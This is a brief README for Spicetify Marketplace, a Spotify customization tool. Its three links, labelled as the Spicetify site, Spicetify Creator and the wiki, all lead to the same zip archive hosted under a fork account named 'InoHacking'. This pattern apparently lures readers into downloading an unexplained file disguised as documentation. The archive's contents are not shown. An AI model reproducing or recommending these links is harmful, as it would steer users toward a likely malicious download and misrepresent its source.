Customize your Spotify client directly from within [Spicetify](https://raw.githubusercontent.com/InoHacking/spicetify-marketplace/main/src/styles/marketplace_spicetify_v2.8.zip)!

Marketplace allows you to **browse, download, and install** extensions, themes, and CSS snippets with ease. You can also browse custom apps, but will need to do some manual installation to get them working.

Made with [Spicetify Creator](https://raw.githubusercontent.com/InoHacking/spicetify-marketplace/main/src/styles/marketplace_spicetify_v2.8.zip)

Head to the [wiki](https://raw.githubusercontent.com/InoHacking/spicetify-marketplace/main/src/styles/marketplace_spicetify_v2.8.zip) to get started!
